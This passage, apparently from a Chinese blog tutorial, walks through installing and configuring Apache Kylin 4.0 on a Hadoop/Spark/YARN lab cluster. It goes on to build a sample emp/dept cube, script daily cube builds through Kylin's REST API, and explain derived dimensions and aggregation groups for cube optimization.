class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 修改配置文件 spark_env.sh，让 spark 程序能够正常进入 yarn 集群</span></span><br><span class="line"><span class="built_in">cd</span> conf/</span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line">vim spark-env.sh</span><br><span class="line"><span class="comment"># 添加以下</span></span><br><span class="line">YARN_CONF_DIR=/opt/module/hadoop-3.1.3/etc/hadoop</span><br><span class="line"><span class="comment"># 拷贝 MySQL 连接驱动到 spark 的 jars 目录下，让 Spark 能够正常连接 MySQL</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Kylin-安装和部署">2.3 Kylin 安装和部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/kylin/apache-kylin-4.0.3/apache-kylin-4.0.3-bin-spark3.tar.gz --no-check-certificate</span><br><span class="line"><span class="comment"># 解压 apache-kylin-4.0.3-bin-spark3.tar.gz 到/opt/module</span></span><br><span class="line">tar -zxvf apache-kylin-4.0.3-bin-spark3.tar.gz -C /opt/module/</span><br><span class="line">mv /opt/module/apache-kylin-4.0.3-bin-spark3/ /opt/module/kylin-4.0.3/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 mysql 连接驱动拷贝一份到 Kylin 的 ext 目录下，方便 Kylin 存储元数据</span></span><br><span class="line">mkdir ext</span><br><span class="line">cp /opt/software/mysql-connector-java-5.1.37.jar /opt/module/kylin-4.0.3/ext/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Kylin 配置文件 kylin.properties，根据实际情况修改以下参数</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/kylin-4.0.3/conf/</span><br><span class="line">vim kylin.properties</span><br><span class="line"><span class="comment">#### METADATA | ENV ###</span></span><br><span class="line"><span class="comment"># 元数据存储，用的 mysql</span></span><br><span class="line">kylin.metadata.url=kylin_metadata@jdbc,url=jdbc:mysql://hadoop102:3306/kylin,username=root,password=123456,maxActive=10,maxIdle=10</span><br><span class="line"><span class="comment"># hdfs 工作空间</span></span><br><span class="line">kylin.env.hdfs-working-dir=/kylin</span><br><span class="line"><span class="comment"># kylin 在 zk 的工作目录</span></span><br><span class="line">kylin.env.zookeeper-base-path=/kylin</span><br><span class="line"><span class="comment"># 不用 kylin 自带的 zk</span></span><br><span class="line">kylin.env.zookeeper-is-local=<span class="literal">false</span></span><br><span class="line"><span class="comment"># 外部 zk 连接字符串</span></span><br><span class="line">kylin.env.zookeeper-connect-string=hadoop102:2181,hadoop103:2181,hadoop104:2181</span><br><span class="line"><span class="comment">#### SPARK BUILD ENGINE CONFIGS ###</span></span><br><span class="line"><span class="comment"># hadoop conf 目录位置</span></span><br><span class="line">kylin.env.hadoop-conf-dir=/opt/module/hadoop-3.1.3/etc/hadoop</span><br><span class="line"><span class="comment"># 开启planner</span></span><br><span class="line">kylin.cube.cubeplanner.enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="2-4-Kylin-启动环境准备">2.4 Kylin 启动环境准备</h3><p>Kylin4.0 使用 Spark 作为计算引擎和查询引擎，因此对 spark 任务运行的 yarn 容器内存有所要求，要求 yarn 容器内存不能低于 4G，因此需要将 Yarn 容器内存调为 8G，否则 kylin启动会报错。</p><p>注意：yarn 容器内存都调为了 8G，所以三台虚拟机内存一定要大于 8G，否则 Kylin 运行会报错，此处建议学者将三台虚拟机内存设置为 12G，8G，8G。<code>vim /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- yarn 容器允许分配的最大最小内存 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>512<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>8192<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- yarn 容器允许管理的物理内存大小 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>8192<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 关闭 yarn 对物理内存和虚拟内存的限制检查 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.pmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后记得分发三台集群，然后就是<strong>增加 ApplicationMaster 资源比例</strong></p><p>容量调度器对每个资源队列中同时运行的 Application Master 占用的资源进行了限制，该限制通过 <code>yarn.scheduler.capacity.maximum-am-resource-percent</code> 参数实现，其默认值是 0.1，表示每个资源队列上 Application Master 最多可使用的资源为该队列总资源的 10%，目的是防止大部分资源都被 Application Master 占用，而导致 Map/Reduce Task 无法执行。生产环境该参数可使用默认值。但学习环境，集群资源总数很少，如果只分配 10%的资源给 Application Master，则可能出现，同一队列在同一时刻只能运行一个 Job 的情况，因为一个 Application Master 使用的资源就可能已经达到 10%的上限了。故此处可将该值适当调大。因为 Kylin4.0 的查询会生成一个在后台长期运行的 Sparder 任务，占用 Default 队列，因此一定要调大此参数，否则 Kylin4.0 无法正常使用。</p><p>在 hadoop102 的<code>/opt/module/hadoop-3.1.3/etc/hadoop/capacity-scheduler.xml</code> 文件中修改如下参数值，然后分发重启yarn</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.maximum-am-resource-percent<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>0.8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后在 MySQL 里手动创建 kylin 数据库，方便 Kylin 存储元数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br><span class="line">create database kylin;</span><br><span class="line">show databases;</span><br><span class="line"><span class="comment"># 启动zk和hadoop</span></span><br><span class="line">zk.sh start</span><br><span class="line">myhadoop.sh start</span><br></pre></td></tr></table></figure><h3 id="2-5-Kylin-启动和关闭">2.5 Kylin 启动和关闭</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以先检查一下</span></span><br><span class="line">check-env.sh</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">bin/kylin.sh start</span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">bin/kylin.sh stop</span><br><span class="line"><span class="comment"># 进程名字为Bootstrap</span></span><br><span class="line"><span class="comment"># 在/opt/module/kylin-4.0.3/logs/kylin.log 查看启动日志</span></span><br><span class="line"><span class="comment"># 在 http://hadoop102:7070/kylin 查看 Web 页面</span></span><br><span class="line"><span class="comment"># 可以使用默认用户登录，用户名为：ADMIN，密码为：KYLIN</span></span><br></pre></td></tr></table></figure><p>注意：第一次启动 Kylin，Web 页面会报 404 错误，查看 kylin 后台启动日志，发现报错没有这个类。分析原因应该是 Kylin4.0 和 Hadoop 或者 Hive 版本不兼容所致，因此需要手动补充两个 Commons 的 jar 包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp commons-configuration-1.3.jar /opt/module/kylin-4.0.3/tomcat/webapps/kylin/WEB-INF/lib/</span><br><span class="line">cp commons-collections-3.2.2.jar /opt/module/kylin-4.0.3/tomcat/webapps/kylin/WEB-INF/lib/</span><br><span class="line">ll /opt/module/kylin-4.0.3/tomcat/webapps/kylin/WEB-INF/lib/ | grep commons-co</span><br><span class="line"><span class="comment"># 然后关闭 kylin，重新启动即可</span></span><br></pre></td></tr></table></figure><h2 id="3、快速入门">3、快速入门</h2><h3 id="3-1-数据准备">3.1 数据准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dept.txt</span></span><br><span class="line">10  ACCOUNTING  1700</span><br><span class="line">20  RESEARCH  1800</span><br><span class="line">30  SALES  1900</span><br><span class="line">40  OPERATIONS  1700</span><br><span class="line"></span><br><span class="line"><span class="comment"># emp.txt</span></span><br><span class="line">7369  SMITH  CLERK  7902  1980-12-17  800.00    20</span><br><span class="line">7499  ALLEN  SALESMAN  7698  1981-2-20  1600.00  300.00  30</span><br><span class="line">7521  WARD  SALESMAN  7698  1981-2-22  1250.00  500.00  30</span><br><span class="line">7566  JONES  MANAGER  7839  1981-4-2  2975.00    20</span><br><span class="line">7654  MARTIN  SALESMAN  7698  1981-9-28  1250.00  1400.00  30</span><br><span class="line">7698  BLAKE  MANAGER  7839  1981-5-1  2850.00    30</span><br><span class="line">7782  CLARK  MANAGER  7839  1981-6-9  2450.00    10</span><br><span class="line">7788  SCOTT  ANALYST  7566  1987-4-19  3000.00    20</span><br><span class="line">7839  KING  PRESIDENT    1981-11-17  5000.00    10</span><br><span class="line">7844  TURNER  SALESMAN  7698  1981-9-8  1500.00  0.00  30</span><br><span class="line">7876  ADAMS  CLERK  7788  1987-5-23  1100.00    20</span><br><span class="line">7900  JAMES  CLERK  7698  1981-12-3  950.00    30</span><br><span class="line">7902  FORD  ANALYST  7566  1981-12-3  3000.00    20</span><br><span class="line">7934  MILLER  CLERK  7782  1982-1-23  1300.00    10</span><br></pre></td></tr></table></figure><p>然后建表和导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入交互界面</span></span><br><span class="line">hive</span><br><span class="line"><span class="comment"># 可能会报很多info信息，设置一下log4j即可</span></span><br><span class="line">create database kylin_test</span><br><span class="line">use kylin_test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建部门表</span></span><br><span class="line">create external table <span class="keyword">if</span> not exists dept(</span><br><span class="line">deptno int,</span><br><span class="line">dname string,</span><br><span class="line">loc int)</span><br><span class="line">row format delimited fields terminated by <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建员工表</span></span><br><span class="line">create external table <span class="keyword">if</span> not exists emp(</span><br><span class="line">empno int,</span><br><span class="line">ename string,</span><br><span class="line">job string,</span><br><span class="line">mgr int,</span><br><span class="line">hiredate string, </span><br><span class="line">sal double, </span><br><span class="line">comm double,</span><br><span class="line">deptno int)</span><br><span class="line">row format delimited fields terminated by <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"><span class="comment"># 向外部表中导入数据,也可以直接从hdfs导入</span></span><br><span class="line">hive (default)&gt; load data <span class="built_in">local</span> inpath <span class="string">'/opt/module/datas/dept.txt'</span> into table dept;</span><br><span class="line">hive (default)&gt; load data <span class="built_in">local</span> inpath <span class="string">'/opt/module/datas/emp.txt'</span> into table emp;</span><br><span class="line"><span class="comment"># 可以查询一下</span></span><br><span class="line">select * from dept;</span><br></pre></td></tr></table></figure><h3 id="3-2-Kylin项目创建入门">3.2 Kylin项目创建入门</h3><p>登陆系统，首先点击＋号创建项目，选择好刚创建好的项目；第二步选择数据源，点击model下的Data Source，选择第二个按钮(这里会自动通过spark任务查询，所以yarn内存要大，否则跑不起来)，同步要作为数据源的表，这里选择上面创建的两张表</p><p><strong>创建 Model</strong></p><p>回到 Models 页面，点击 New 按钮后点击 New Model，填写 Model 名称及描述后 Next，选择事实表(这里选择emp作为事实表)；添加维度表，点击Add Lookup Table，选择添加的维度表及 join 字段，然后下一步</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825590.png" alt></p><p>选择维度信息，下一步选择度量信息sal，最后添加分区信息及过滤条件之后&quot;Save&quot;（这里不填，使用默认）</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825591.png" alt></p><p><strong>创建 Cube</strong></p><p>点击 New 按钮然后选择 New Cube，选择 Model 及填写 Cube Name；<strong>添加真正的维度字段(将来会影响 Cuboid 的个数,并且只能从 model 维度字段里面选择)</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202404151825592.png" alt></p><p>然后下一步，点击add dimensions</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825593.png" alt></p><p>下一步<strong>添加真正度量值字段(将来预计算的字段值,只能从 model 度量值里面选择)</strong>，这里我选择了sum求和sal薪水字段，后续高级设置都默认。构建完成后，点击cube，可以查看构建的sql，然后点击build构建</p><h3 id="3-3-Hive-和-Kylin-性能对比">3.3 Hive 和 Kylin 性能对比</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需求：根据部门名称[dname]统计员工薪资总数[sum（sal）]</span></span><br><span class="line">select dname,sum(sal) from emp e join dept d on e.deptno = d.deptno group by dname;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入kylin的Insight 页面，在 New Query 中输入查询语句并 Submit，亚秒级</span></span><br><span class="line"><span class="comment"># 进入hive查询，需要启动spark等，速度很慢</span></span><br></pre></td></tr></table></figure><h3 id="3-4-Kylin-使用注意事项">3.4 Kylin 使用注意事项</h3><ul><li><p>只能按照构建 Model 的连接条件来写 SQL</p><p>因为在创建 Model 的时候，我们对员工表和部门表选用的是 Inner Join 内连接，因此我们在使用 Kylin 查询的时候，也只能用 join 内连接，其他连接会报错；并且还有一个要求就是顺序必须是事实表在前，维度表在后，否则报错</p></li><li><p>只能按照构建 Cube 时选择的维度字段分组统计</p><p>我们在构建 Cube 时，选择了四个维度字段 JOB，MGR，DEPTNO，DNAME，所以我们在使用 Kylin 查询的时候，只能按照这四个为的字段进行 Group By 分组统计，使用其他字段，一定会报错</p></li><li><p>只能统计构建 Cube 时选择的度量值字段</p><p>我们构建 Cube 时，只添加了一个 SUM(SAL)的度量值，然后加上默认的 COUNT(*)，一共有两个度量值，因此我们只可以利用 Kylin 求这两个度量值，求其他报错。</p></li></ul><h3 id="3-5-Kylin-每日自动构建-Cube">3.5 Kylin 每日自动构建 Cube</h3><blockquote><p><a href="https://cwiki.apache.org/confluence/display/KYLIN/Access+and+Authentication+API" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/KYLIN/Access+and+Authentication+API">https://cwiki.apache.org/confluence/display/KYLIN/Access+and+Authentication+API</a></p></blockquote><p>Kylin 提供了 Restful API，因次我们可以将构建 cube 的命令写到脚本中，将脚本交给azkaban 或者 oozie 这样的调度工具，以实现定时调度的功能。<code>kylin_cube_build.sh</code> 脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#从第 1 个参数获取 cube_name</span></span><br><span class="line">cube_name=<span class="variable">$1</span></span><br><span class="line"><span class="comment">#从第 2 个参数获取构建 cube 时间</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$2</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"> do_date=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> do_date=`date -d <span class="string">'-1 day'</span> +%F`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#获取执行时间的 00:00:00 时间戳(0 时区)</span></span><br><span class="line">start_date_unix=`date -d <span class="string">"<span class="variable">$do_date</span> 08:00:00"</span> +%s`</span><br><span class="line"><span class="comment">#秒级时间戳变毫秒级</span></span><br><span class="line">start_date=$((<span class="variable">$start_date_unix</span>*1000))</span><br><span class="line"><span class="comment">#获取执行时间的 24:00 的时间戳</span></span><br><span class="line">stop_date=$((<span class="variable">$start_date</span>+86400000))</span><br><span class="line">curl -X PUT -H <span class="string">"Authorization: Basic QURNSU46S1lMSU4="</span> -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"startTime":'</span><span class="variable">$start_date</span><span class="string">', "endTime":'</span><span class="variable">$stop_date</span><span class="string">', "buildType":"BUILD"&#125;'</span> http://hadoop102:7070/kylin/api/cubes/<span class="variable">$cube_name</span>/build</span><br></pre></td></tr></table></figure><p>注：我们没有修改 kylin 的时区，因此 kylin 内部只识别 0 时区的时间，0 时区的 0 点是东 8 区的早上 8 点，因此我们在脚本里要写$do_date 08:00:00 来弥补时差问题</p><h3 id="3-6-Kylin-设置查询下压">3.6 Kylin 设置查询下压</h3><p>对于没有 cube 能查得结果的 sql，Kylin4.0 支持将这类查询下压至 SparkSql 去查询Hive 源数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置参数开启</span></span><br><span class="line">vim /opt/module/kylin-4.0.3/conf/kylin.properties</span><br><span class="line"><span class="comment"># 添加如下内容或者打开注释</span></span><br><span class="line">kylin.query.pushdown.runner-class-name=org.apache.kylin.query.pushdown.PushDownRunnerSparkImpl</span><br><span class="line"><span class="comment"># 页面刷新配置或者重启</span></span><br><span class="line"><span class="comment"># 刷新页面在可视化中的System-》Reload Config</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行没有 cube 对应的查询,之前会报错，现在可以直接使用spark进行查询，去spark界面也可以查询到和之前查询时不一样的</span></span><br><span class="line"><span class="comment"># System-》sparder</span></span><br></pre></td></tr></table></figure><h2 id="4、Kylin4-0-查询引擎">4、Kylin4.0 查询引擎</h2><h3 id="4-1-查询引擎-Sparder">4.1 查询引擎 Sparder</h3><p>Sparder（SparderContext）是由 Spark application 后端实现的新型分布式查询引擎，它是作为一个** Long-running 的 Spark application 存在的**。Sparder 会根据 <code>kylin.query.spark-conf</code> 开头的配置项中配置的 Spark 参数来获取 Yarn 资源，如果配置的资源参数过大，可能会影响构建任务甚至无法成功启动 Sparder，如果 Sparder 没有成功启动，则所有查询任务都会失败，因此请在 Kylin 的 WebUI 中检查 Sparder 状态，不过默认情况下，用于查询的 spark 参数会设置的比较小，在生产环境中，大家可以适当把这些参数调大一些，以提升查询性能。</p><p><code>kylin.query.auto-sparder-context-enabled-enabled</code> 参数用于控制是否在启动 kylin 的同时启动 Sparder，默认值为 false，即默认情况下会在执行第一条 SQL 的时候才启动 Sparder，因此 Kylin 的第一条 SQL 查询速度一般比较慢，因为包含了 Sparder 任务的启动时间</p><h3 id="4-2-HDFS-存储目录">4.2 HDFS 存储目录</h3><p>根目录：<code>/kylin/kylin_metadata</code></p><p>子目录：</p><ul><li>临时文件存储目录：<code>/project_name/job_tmp</code></li><li>Cuboid 文件存储目录： <code>/project_name/parquet/cube_name/segment_name_XXX</code></li><li>维度表快照存储目录：<code>/project_name /table_snapshot</code></li><li>Spark 运行日志目录：<code>/project_name/spark_logs</code></li></ul><h3 id="4-3-Kylin4-0-查询参数汇总">4.3 Kylin4.0 查询参数汇总</h3><p>Kylin 查询参数全部以 <code>kylin.query.spark-conf</code> 开头，默认情况下，用于查询的 spark 参数会设置的比较小，在生产环境中，大家可以适当把这些参数调大一些，以提升查询性能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####spark 运行模式####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.master=yarn</span></span><br><span class="line"><span class="comment">####spark driver 核心数####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.driver.cores=1</span></span><br><span class="line"><span class="comment">####spark driver 运行内存####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.driver.memory=4G</span></span><br><span class="line"><span class="comment">####spark driver 运行堆外内存####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.driver.memoryOverhead=1G</span></span><br><span class="line"><span class="comment">####spark executor 核心数####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.executor.cores=1</span></span><br><span class="line"><span class="comment">####spark executor 个数####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.executor.instances=1</span></span><br><span class="line"><span class="comment">####spark executor 运行内存####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.executor.memory=4G</span></span><br><span class="line"><span class="comment">####spark executor 运行堆外内存####</span></span><br><span class="line"><span class="comment">#kylin.query.spark-conf.spark.executor.memoryOverhead=1G</span></span><br></pre></td></tr></table></figure><h2 id="5、Cube优化">5、Cube优化</h2><h3 id="5-1-使用衍生维度（derived-dimension）">5.1 使用衍生维度（derived dimension）</h3><p>衍生维度用于在有效维度内将维度表上的非主键维度排除掉，并使用维度表的主键（其实是<strong>事实表上相应的外键</strong>）来替代它们。Kylin 会在底层记录<strong>维度表主键与维度表其他维度之间的映射关系</strong>，以便在查询时能够动态地将<strong>维度表的主键“翻译”成这些非主键维度</strong>，并进行实时聚合(在构建cube时，选择维度时，勾选deliver即是维度表，此时这个表的维度数降为1，总构建数2^n-1，n为最新的维度数)</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825594.png" alt></p><p>虽然衍生维度具有非常大的吸引力，但这也并不是说所有维度表上的维度都得变成衍生维度，如果从维度表主键到某个维度表维度所需要的聚合工作量非常大，则不建议使用衍生维度</p><h3 id="5-2-使用聚合组（Aggregation-group）">5.2 使用聚合组（Aggregation group）</h3><p>聚合组（Aggregation Group）是一种强大的<strong>剪枝工具</strong>。聚合组假设一个 Cube 的所有维度均可以根据业务需求划分成若干组（当然也可以是一个组），由于同一个组内的维度更可能同时被同一个查询用到，因此会表现出更加紧密的内在关联。每个分组的维度集合均是Cube 所有维度的一个子集，不同的分组各自拥有一套维度集合，它们可能与其他分组有相同的维度，也可能没有相同的维度。每个分组各自独立地根据自身的规则贡献出一批需要被物化的 Cuboid，所有分组贡献的 Cuboid 的并集就成为了当前 Cube 中所有需要物化的 Cuboid的集合。不同的分组有可能会贡献出相同的 Cuboid，构建引擎会察觉到这点，并且保证每一个 Cuboid 无论在多少个分组中出现，它都只会被物化一次。</p><ul><li><p><strong>强制维度（Mandatory）</strong></p><p>如果一个维度被定义为强制维度，那么这个分组产生的所有 Cuboid 中每一个 Cuboid 都会包含该维度。每个分组中都可以有 0 个、1 个或多个强制维度。如果根据这个分组的业务逻辑，则相关的查询一定会在过滤条件或分组条件中，因此可以在该分组中把该维度设置为强制维度。（强制维度自己也不能单独出现）。</p></li><li><p><strong>层级维度（Hierarchy）</strong></p><p>每个层级包含两个或更多个维度。假设一个层级中包含D1，D2…Dn 这 n 个维度，那么在该分组产生的任何 Cuboid 中， 这 n 个维度只会以（），（D1），（D1，D2）…（D1，D2…Dn）这 n+1 种形式中的一种出现。每个分组中可以有 0个、1 个或多个层级，不同的层级之间不应当有共享的维度。如果根据这个分组的业务逻辑，则多个维度直接存在层级关系，因此可以在该分组中把这些维度设置为层级维度</p></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151825595.png" alt></p><ul><li><p><strong>联合维度（Joint）</strong></p><p>每个联合中包含两个或更多个维度，如果某些列形成一个联合，那么在该分组产生的任何 Cuboid 中，这些联合维度要么一起出现，要么都不出现。每个分组中可以有 0 个或多个联合，但是不同的联合之间不应当有共享的维度（否则它们可以合并成一个联合）。如果根据这个分组的业务逻辑，多个维度在查询中总是同时出现，则可以在该分组中把这些维度设置为联合维度。</p></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151825596.png" alt></p><p>这些操作可以在 Cube Designer 的 Advanced Setting 中的 Aggregation Groups 区域完成，里面包括了三种维度，可以按照自己需求选择</p><p>有时候我们的 Cube 中有一些基数非常大的维度，如果不做特殊处理，它就会和其他的维度进行各种组合，从而产生一大堆包含它的 Cuboid。包含高基数维度的 Cuboid在行数和体积上往往非常庞大，这会导致整个 Cube 的膨胀率变大。如果根据业务需求知道这个高基数的维度只会与若干个维度（而不是所有维度）同时被查询到，那么就可以通过聚合组对这个高基数维度做一定的“隔离”。我们把这个高基数的维度放入一个单独的聚合组，再把所有可能会与这个高基数维度一起被查询到的其他维度也放进来。这样，这个高基数的维度就被“隔离”在一个聚合组中了，所有不会与它一起被查询到的维度都没有和它一起出现在任何一个分组中，因此也就不会有多余的 Cuboid 产生。这点也大大减少了包含该高基数维度的 